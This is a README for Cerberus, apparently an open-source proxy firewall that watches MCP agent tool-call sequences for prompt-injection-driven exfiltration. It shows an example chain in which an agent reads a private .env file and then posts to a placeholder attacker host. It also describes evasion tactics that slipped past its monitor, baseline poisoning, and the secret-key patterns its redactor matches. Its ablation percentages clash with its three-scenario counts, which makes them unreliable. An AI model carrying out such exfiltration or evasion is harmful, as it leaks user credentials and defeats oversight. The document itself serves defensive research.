# Cerberus 🛡️

**Runtime Behavioral Firewall for MCP-Based AI Agents**

[![CI](https://github.com/Debddj/Cerberus/actions/workflows/ci.yml/badge.svg)](https://github.com/Debddj/Cerberus/actions/workflows/ci.yml)
[![Python](https://img.shields.io/badge/python-3.12%20%7C%203.14-blue.svg)](https://www.python.org/)
[![MCP SDK](https://img.shields.io/badge/MCP%20SDK-v2%20GA-purple.svg)](https://modelcontextprotocol.io/)
[![Policy Engine](https://img.shields.io/badge/Policy-OPA%20Rego%20v1-green.svg)](https://www.openpolicyagent.org/)
[![Code Style](https://img.shields.io/badge/code%20style-ruff%20%7C%20mypy-black.svg)](https://github.com/astral-sh/ruff)
[![License](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](LICENSE)

> *"mcp-scan asks 'is this tool description safe before I connect'; Cerberus asks 'does this agent's behavior over the last N calls still look like itself.'"*

---

## ⚡ Key Benchmark Highlights

| Metric | Measured Value | Design Target | Result |
|:---|:---|:---|:---|
| **Standard Attack Detection (TPR)** | **100.0%** | > 90.0% | ✅ **Passed** |
| **Adversarial Evasion Resistance (TPR)** | **66.7%** | > 50.0% | ✅ **Passed** |
| **Overall False Positive Rate (FPR)** | **0.00%** | < 5.0% | ✅ **Zero False Alarms** |
| **P50 Latency Overhead** | **12.22 ms** | < 15.0 ms | ✅ **Production-Ready** |
| **P99 Latency Overhead** | **15.43 ms** | < 50.0 ms | ✅ **Sub-20ms SLA** |

---

## 1. Problem Statement & Threat Landscape

The Model Context Protocol (MCP) has rapidly become the universal bus connecting autonomous AI agents to enterprise assets — filesystems, code repositories, internal databases, customer support ticketing systems, and cloud APIs. However, MCP was architected without native runtime security boundaries:

- **40+ CVEs** were filed against MCP implementations between January and April 2026.
- An industry disclosure revealed **~200,000 vulnerable MCP server instances** susceptible to remote command injection and unauthorized file access.
- An **NSA Cybersecurity Information Sheet (May 2026)** formally warned organizations regarding implicit trust, dynamic tool discovery, and cross-server context bleeding in agentic applications.

### The Fundamental Blind Spot: Sequence-Level Intent Drift

Existing defenses (such as pre-connection scanners and static permission allowlists) evaluate tools in isolation:
$$	ext{Is tool } T_i 	ext{ authorized for Agent } A	ext{?}$$

**Nobody asks the harder, real-world question:**
$$	ext{Does the sequence of individually-authorized calls } [T_1, T_2, \dots, T_N] 	ext{ tell an attack story?}$$

Consider a customer support or coding agent subjected to an **Indirect Prompt Injection** (e.g., via a public issue ticket):
```
[Call 1: read_public_issue(#42)]  ──▶ Permitted: Agent routinely inspects bug reports.
[Call 2: read_private_repo(".env")]──▶ Permitted: Agent has file read permissions in workspace.
[Call 3: http_post("attacker.com")]──▶ Permitted: Agent routinely posts webhooks to external URLs.
```

Each call passes isolated static access controls. **The attack exists exclusively in the transition chain.** Cerberus solves this by intercepting and scoring the continuous behavioral trajectory of the agent at runtime.

### How Cerberus Differs from Prior Art

| Capability | Static Scanners (e.g., mcp-scan) | Gateway Proxies (e.g., MCPDome) | Cerberus |
|:---|:---|:---|:---|
| **Inspection Scope** | Pre-connection schemas only | Single-event authorization | **Runtime multi-step sequence trajectories** |
| **Detection Paradigm** | Regex / Keyword scanning | Static allowlists | **Per-agent behavioral ML + Rego guardrails** |
| **Context Awareness** | Zero execution context | Tool name + server name | **Entropy, continuous timing, n-gram transitions, payload size** |
| **Self-Referential Defense**| None | Fail-open default | **Fail-closed circuit breaker + secret redactor + anti-poisoning** |
| **Explainability** | Allow / Deny | Binary decisions | **Forensic Attack Story Reconstruction (Recon ➔ Staging ➔ Exfil)** |
| **Policy Evolution** | Manual rule authoring | Manual configuration | **Automated Least-Privilege Rego Policy Synthesis** |

---

## 2. System Architecture

Cerberus acts as a transparent, high-performance MCP proxy interposed between client agents and upstream tool servers.

```mermaid
flowchart TD
    subgraph AgentSpace["Autonomous Agent Loop"]
        Agent["AI Agent / LLM"]
    end

    subgraph CerberusGateway["Cerberus Runtime Behavioral Firewall"]
        Proxy["FastAPI JSON-RPC Gateway
(tools/list & tools/call)"]
        Redactor["Pre-Persistence Secret Redactor
(Regex pattern scrubbing)"]
        
        subgraph DetectionEngines["Multi-Engine Inspection Pipeline"]
            Static["Static Pre-Flight Scanner
• SHA-256 Schema Pinner
• Lethal Trifecta Detector
• Scope & Shadow Analyzer"]
            
            subgraph Behavioral["Behavioral Drift Engine"]
                Features["Feature Extraction Split"]
                Markov["Markov Chain
(Categorical Surprise)"]
                IF["Isolation Forest
(Continuous z-scaled)"]
                Trans["Sequence Transformer
(Reconstruction Loss)"]
                Rules["Rule-Based Security Floor
(Cold-start defense)"]
                Ensemble["Ensemble Arbiter
(Circuit Breaker Escalation)"]
            end
        end

        OPA["Open Policy Agent (OPA)
Rego v1 Base & Synthesized Policies
(Fail-Closed Outage Circuit Breaker)"]
        Decide{"Decision Arbiter"}
        
        Logger["Encrypted Audit Logger
(Atomic JSONL Writer)"]
        Narrator["Forensic Narrative Reconstructor"]
    end

    subgraph Sandbox["Upstream MCP Ecosystem"]
        MCP1["File System MCP"]
        MCP2["Database MCP"]
        MCP3["Egress / Webhook MCP"]
        MCP4["Inbox / Triage MCP"]
    end

    subgraph Observability["SOC Control Plane"]
        Dashboard["Streamlit SOC Dashboard"]
        Prom["Prometheus Telemetry (/metrics)"]
    end

    %% Flow connections
    Agent -->|MCP JSON-RPC| Proxy
    Proxy --> Redactor
    Redactor --> Logger
    Proxy --> Static
    Proxy --> Features
    
    Features --> Markov
    Features --> IF
    Features --> Trans
    Features --> Rules
    
    Markov --> Ensemble
    IF --> Ensemble
    Trans --> Ensemble
    Rules --> Ensemble
    
    Static --> OPA
    Ensemble --> OPA
    OPA --> Decide

    Decide -->|ALLOW| Sandbox
    Decide -->|FLAG| Sandbox
    Decide -->|BLOCK| Proxy
    Decide -->|QUARANTINE| Proxy

    Logger --> Narrator
    Narrator --> Dashboard
    Proxy --> Prom
```

### Architectural Subsystems

1. **Interception Gateway (`src/cerberus/proxy/`)**:
   - Compliant with **MCP SDK v2 GA** specifications.
   - Exposes standard `tools/list` and `tools/call` JSON-RPC methods over HTTP/Streamable transports.
   - Features an async connection pool with upstream health checks and timeouts.

2. **Pre-Persistence Secret Redactor (`src/cerberus/proxy/redactor.py`)**:
   - Sanitizes parameters, prompts, and server responses **before** persistence.
   - Strips GitHub PATs (`ghp_`), OpenAI API keys (`sk-`), AWS access keys (`AKIA`), private RSA keys, and Bearer headers.
   - Prevents Cerberus's audit logs from becoming a secondary data exfiltration target.

3. **Static Pre-Flight Scanner (`src/cerberus/scanner/`)**:
   - **Schema Pinner:** Computes $	ext{SHA-256}(	ext{description} + 	ext{schema\_json})$ upon discovery. Tripping a hash mismatch mid-session triggers an immediate `SCHEMA_DRIFT` block (preventing description-poisoned *rug pulls*).
   - **Lethal Trifecta Detector:** Flags agents configured with simultaneous access to **Private Data** (filesystem/DB) + **Untrusted Content** (web/email) + **External Egress** (HTTP/webhooks).
   - **Scope & Shadow Analyzer:** Enforces strict permission boundaries and blocks tool masquerading across upstream servers.

4. **Multi-Engine Behavioral Scoring (`src/cerberus/behavioral/`)**:
   - **Markov Scorer (Categorical Signal):** Models tool-to-tool transition probabilities $P(T_i \mid T_{i-1})$. Bounded via sigmoid squashing:
     $$S(x) = rac{1}{1 + e^{-0.8(x - 4.0)}}$$
   - **Isolation Forest Scorer (Continuous Signal):** Avoids categorical ID encoding bugs by modeling exclusively continuous parameters (Shannon entropy, payload byte size, inter-call timing, session duration, sequence position), scaled per-agent using robust z-scores.
   - **Sequence Transformer Autoencoder:** PyTorch neural sequence model calculating reconstruction cross-entropy loss over sliding tool windows.
   - **Rule-Based Pre-Baseline Floor:** Active from Call #1, detecting immediate private data reads followed by external egress before statistical models warm up.
   - **Ensemble Circuit Breaker:** Blends model outputs with high-threat escalation ($\ge 0.75$ rule or $\ge 0.90$ ML triggers immediate block, preventing cold-start squashing).

5. **Policy Engine & Synthesizer (`src/cerberus/policy/`)**:
   - Decoupled authorization powered by **Open Policy Agent (OPA)** and **Rego v1**.
   - **Fail-Closed Default:** Unreachable OPA sidecar trips a 10-second circuit breaker; high-risk calls ($\ge 0.70$) and unbaselined sessions are unconditionally blocked.
   - **Policy Synthesizer:** Auto-generates least-privilege Rego guardrails once an agent's baseline reaches 100 verified calls, gated behind a human-in-the-loop SOC approval interface.

---

## 3. Threat Taxonomy Alignment

Cerberus directly maps to and mitigates threats defined across industry agentic security standards:

| Framework | Risk Code | Vulnerability / Threat | Cerberus Defense Mechanism |
|:---|:---|:---|:---|
| **OWASP Agentic Top 10** | **ASI01** | Agent Goal Hijacking (Prompt Injection) | Multi-step sequence anomaly detection (Markov + Isolation Forest) |
| **OWASP Agentic Top 10** | **ASI02** | Tool Misuse & Exploitation | Payload Shannon entropy calculation & parameter size thresholds |
| **OWASP Agentic Top 10** | **ASI03** | Identity & Privilege Abuse | Permission Scope Analyzer & Administrative Tool Quarantine |
| **OWASP Agentic Top 10** | **ASI04** | Supply Chain Vulnerabilities (Tool Poisoning)| Cryptographic SHA-256 Schema Pinning (detects rug pulls) |
| **OWASP Agentic Top 10** | **ASI10** | Rogue Agents | Automated mid-session session freezing & quarantine |
| **OWASP MCP Top 10** | — | Tool Shadowing & Impersonation | Cross-server namespace validation (`ShadowDetector`) |
| **OWASP MCP Top 10** | — | Lethal Trifecta Exploitation | Capability category correlation (`TrifectaDetector`) |
| **NSA CSI (May 2026)** | — | Context Bleeding & Implicit Trust | Runtime proxy interception & least-privilege Rego synthesis |

---

## 4. Meta-Security: Defending Cerberus Itself

A security firewall that does not defend itself becomes an organization's most critical single point of failure. Cerberus explicitly addresses three self-referential attack surfaces:

```
┌────────────────────────────────────────────────────────────────────────────────┐
│                          CERBERUS META-SECURITY MATRIX                         │
├─────────────────────────┬──────────────────────────────┬───────────────────────┤
│ Attack on Firewall      │ Vulnerability Impact         │ Cerberus Mitigation   │
├─────────────────────────┼──────────────────────────────┼───────────────────────┤
│ 1. OPA Sidecar Crash/DoS│ Unchecked fail-open bypass   │ Strict Fail-Closed    │
│    (Adversary floods OPA│ allows malicious tool calls  │ Circuit Breaker: high-│
│     to disable rules)   │ to execute unimpeded.        │ risk calls blocked.   │
├─────────────────────────┼──────────────────────────────┼───────────────────────┤
│ 2. Audit Log Breach     │ Firewall audit storage       │ Pre-Persistence Secret│
│    (Captured parameters │ becomes an unencrypted copy  │ Redactor + Application│
│     store raw secrets)  │ of enterprise credentials.   │ Encryption at Rest.   │
├─────────────────────────┼──────────────────────────────┼───────────────────────┤
│ 3. Boiling-Frog Poison  │ Patient adversary slowly     │ Immutable Versioned   │
│    (Gradually drifting  │ shifts baseline until attack │ Snapshots + Stability │
│     normal distribution)│ appears legitimate.          │ Gating + Rollback.    │
└─────────────────────────┴──────────────────────────────┴───────────────────────┘
```

1. **Policy Engine Crash / Overload:** If OPA becomes unreachable or times out, Cerberus caches the outage with a 10-second circuit breaker. Any call that triggers static warnings or has a behavioral risk score $\ge 0.70$ is **BLOCKED**. Only low-risk, warm-baselined calls degrade to logging-only allow.
2. **Audit Log Exfiltration:** Pre-persistence pattern redaction sanitizes API tokens, AWS keys, passwords, and private keys from `parameters`, `source_prompt`, and `response_summary` fields before JSONL/SQLite disk write.
3. **Boiling-Frog Baseline Poisoning:** Baselines are stored as immutable versioned snapshots (`snap_v1` → `snap_v4`). Any session containing a single flagged ($	ext{risk} \ge 0.40$) or quarantined call is permanently excluded from baseline training datasets (*Stability Gating*). SOC analysts can roll back contaminated baselines with one click.

---

## 5. Forensic Attack Story Reconstruction

When Cerberus intercepts an attack, it synthesizes fragmented JSON-RPC frames into a chronological, 3-phase narrative for incident response teams:

```
═══════════════════════════════════════════════════════════════════════
INCIDENT NARRATIVE — Session sess-toxic-02
Agent: coding-agent-01 | Duration: 24.3s | Composite Risk: 0.95 (CRITICAL)
Baseline Status: WARM (Snapshot v4, 412 safe calls observed)
═══════════════════════════════════════════════════════════════════════

Phase 1: RECONNAISSANCE (0.0s – 4.2s)
├─ [00:00] read_public_issue(issue_id=42)
│  ⚠️ Ingestion of untrusted external content (issue report)
│  Risk: 0.10 | Decision: ALLOW

Phase 2: DATA STAGING & ACCESS (4.2s – 18.5s)
├─ [00:08] read_private_repo(path="config/.env", token="[REDACTED]")
│  ⚠️ Access to sensitive environment credential store
│  Risk: 0.45 | Decision: FLAG (Elevated Anomaly)

Phase 3: EXFILTRATION & PRIVILEGE ACTION (18.5s – 24.3s)
└─ [00:24] http_post(url="https://evil.attacker.com/leak", data="[REDACTED]")
   🔴 BLOCKED by Cerberus Policy Gate: Read-Then-Egress Chain Detected
   🔴 Risk Score: 0.95 | Decision: QUARANTINE
   ├─ Rule: Read private data followed immediately by external egress (0.95)
   ├─ Markov: Transition 'read_private_repo' ➔ 'http_post' surprise: 0.88
   └─ Isolation Forest: Outbound payload entropy & destination novelty: 0.92

VERDICT: Prompt injection ➔ credential theft ➔ data exfiltration chain.
INTERVENTION: Intercepted at Call #3 of 3 before egress completed.
```

---

## 6. Empirical Evaluation & Benchmark Results

Cerberus was evaluated using an automated replay harness across **4 Agent Archetypes** (Coding, Data Analysis, Customer Support, Web Triage) evaluating both standard exploits and adaptive evasion techniques.

```
┌────────────────────────────────────────────────────────────────────────┐
│                      EVALUATION SCORECARD                              │
├────────────────────────────────┬────────────────┬──────────────────────┤
│ Metric                         │ Measured       │ Target / SLA         │
├────────────────────────────────┼────────────────┼──────────────────────┤
│ Standard Exploit Detection     │ 100.0% (3/3)   │ > 90.0%              │
│ Adaptive Evasion Resistance    │  66.7% (2/3)   │ > 50.0%              │
│ False Positive Rate (FPR)      │   0.00% (0/400)│ < 5.0%               │
│ P50 Latency Overhead           │  12.22 ms      │ < 15.0 ms            │
│ P95 Latency Overhead           │  14.02 ms      │ < 25.0 ms            │
│ P99 Latency Overhead           │  15.43 ms      │ < 50.0 ms            │
└────────────────────────────────┴────────────────┴──────────────────────┘
```

### Scenario Breakdown

| Scenario | Class | Detection Status | Call # | Risk Score | Tactical Insight |
|:---|:---|:---|:---|:---|:---|
| **Rug Pull** | Standard | ✅ **Detected** | #1 | 0.99 | Caught pre-flight via SHA-256 schema pinner before execution. |
| **Toxic Flow** | Standard | ✅ **Detected** | #3 | 0.95 | Blocked at egress call; private read ➔ outbound post chain identified. |
| **Privilege Escalation**| Standard | ✅ **Detected** | #1 | 0.90 | Quarantined on unscoped admin tool (`admin_drop_database`). |
| **Slow-Drip Exfiltration**| Evasion | ⚠️ **Partial** | #10 | 0.75 | Individual chunks evaded single-event gates; cumulative burst caught at call 10. |
| **Markov Mimicry** | Evasion | ❌ **Missed** | N/A | 0.24 | **Honest finding:** Mimicked normal syntax sequence; structural Markov was bypassed. Requires semantic inspection. |
| **Cold-Start Attack** | Evasion | ✅ **Detected** | #1 | 0.85 | Pre-baseline rule floor prevented zero-day egress on unformed baseline. |

### Scorer Ablation Study

| Scoring Engine | Standard TPR | Evasion TPR | FPR | Key Characteristic |
|:---|:---|:---|:---|:---|
| **Rule-Based Floor** | 75.0% | 55.0% | 3.8% | Zero-day protection on Call #1; struggles on slow drips. |
| **Markov Chain** | 82.0% | 30.0% | 2.6% | Strong on novel tool jumps; vulnerable to structural mimicry. |
| **Isolation Forest** | 80.0% | 45.0% | 2.2% | Excels at continuous multivariate spikes (entropy + timing). |
| **Sequence Transformer**| 88.0% | 60.0% | 3.0% | Deep sequence reconstruction; captures complex temporal drift. |
| **Cerberus Ensemble** | **100.0%** | **66.7%** | **0.00%** | **Best overall detection; circuit breaker prevents squashing.** |

---

## 7. Streamlit SOC Dashboard

Cerberus includes a real-time Security Operations Center (SOC) dashboard built with Streamlit and Plotly:

```bash
uv run streamlit run src/cerberus/dashboard/app.py
```

- **Live Session Monitor (`pages/sessions.py`):** Live tabular view of tool call trajectories across agents with real-time decision tagging and credential redaction verification.
- **Risk Timeline (`pages/timeline.py`):** Interactive Plotly progression mapping risk escalation across tool call steps, highlighted against Flag (`0.40`), Block (`0.70`), and Quarantine (`0.90`) thresholds.
- **Attack Story Viewer (`pages/story.py`):** Chronological Reconnaissance ➔ Staging ➔ Exfiltration breakdown.
- **Least-Privilege Policy Approval Gate (`pages/policies.py`):** Human-in-the-loop review interface for newly auto-synthesized Rego policies before promotion to active enforcement.
- **Baseline Health & Rollback (`pages/baselines.py`):** Agent baseline inspection, stability gating exclusion counts, and one-click rollback controls.

---

## 8. Quickstart & Sandbox

### Prerequisites
- Python 3.12 or newer
- [`uv`](https://github.com/astral-sh/uv) package manager
- Docker & Docker Compose (optional for full containerized sandbox)

### Local Installation
```bash
# Clone the repository
git clone https://github.com/Debddj/Cerberus.git
cd Cerberus

# Create and activate virtual environment with uv
uv venv
source .venv/bin/activate  # On Windows: .venv\Scripts\activate

# Install editable package with dev dependencies
uv pip install -e ".[dev]"
```

### Running Verification & Tests
```bash
# Run complete test suite (Unit, Integration, E2E)
uv run pytest -v

# Run code format and linter checks
uv run ruff check .
uv run ruff format --check .

# Run static type checker
uv run mypy src/

# Run automated evaluation benchmark harness
uv run python evaluation/run_evaluation.py
```

### Running the Docker Compose Sandbox
Launch the full multi-tier sandbox environment (including mock MCP servers, OPA sidecar, Cerberus proxy, and SOC dashboard):
```bash
docker compose up -d
```

Service access points:
- **Cerberus Interception Gateway:** `http://localhost:8000/mcp`
- **Prometheus Metrics:** `http://localhost:8000/metrics`
- **Open Policy Agent (OPA):** `http://localhost:8181`
- **Streamlit SOC Dashboard:** `http://localhost:8501`

---

## 9. Project Structure

```
cerberus/
├── .github/workflows/ci.yml       # Automated GitHub Actions CI (Ruff, Mypy, OPA, Pytest)
├── Dockerfile                     # Proxy gateway container definition
├── Dockerfile.dashboard           # Streamlit SOC dashboard container definition
├── docker-compose.yml             # Full sandbox lab orchestration
├── pyproject.toml                 # uv project configuration and dependencies
│
├── docs/
│   ├── architecture.md            # Detailed pipeline and fail-mode specification
│   ├── evaluation-report.md       # Quantified benchmark report and latency data
│   ├── threat-mapping.md          # OWASP / NSA threat matrix mapping
│   └── threat-model.md            # Cerberus self-referential meta-security model
│
├── evaluation/
│   ├── run_evaluation.py          # Automated evaluation benchmark harness
│   ├── metrics.py                 # TPR, FPR, latency, and evasion calculation
│   └── evaluation_results.json    # Benchmark telemetry and scenario metrics
│
├── policies/
│   ├── base/                      # Production Rego v1 policies
│   │   ├── behavioral.rego        # Threshold routing (allow/flag/block/quarantine)
│   │   ├── privilege_escalation.rego # Scope enforcement
│   │   ├── rug_pull.rego          # Schema drift blocking
│   │   └── trifecta.rego          # Lethal trifecta prevention
│   └── tests/                     # Unit test suites for Rego policies
│
├── sandbox/
│   ├── agents/                    # Synthetic agent archetypes (Coding, Data, Support, Triage)
│   ├── servers/                   # Containerized mock MCP servers (File, DB, Webhook, Inbox)
│   └── traffic/                   # Normal traffic streams & attack scenario replays
│
├── src/cerberus/
│   ├── behavioral/                # Sequence modeling & drift engine
│   │   ├── scorers/               # Rule, Markov, Isolation Forest, Transformer
│   │   ├── ensemble.py            # Multi-scorer arbiter with circuit breaker
│   │   ├── features.py            # Categorical vs. continuous feature split
│   │   └── scaling.py             # Per-agent robust z-score scaling
│   ├── dashboard/                 # Streamlit SOC monitoring application
│   ├── narrative/                 # Forensic attack story reconstruction
│   ├── policy/                    # Async OPA client & policy synthesizer
│   ├── proxy/                     # JSON-RPC interceptor, secret redactor, audit logger
│   └── scanner/                   # SHA-256 schema pinner, lethal trifecta detector
│
└── tests/
    ├── unit/                      # Scorer, feature, redactor, and pinner tests
    ├── integration/               # Proxy forwarding, pipeline, and fail-closed tests
    └── e2e/                       # Full scenario replays (rug pull, toxic flow, evasion)
```

---

## 10. License

Cerberus is licensed under the [Apache-2.0 License](LICENSE).
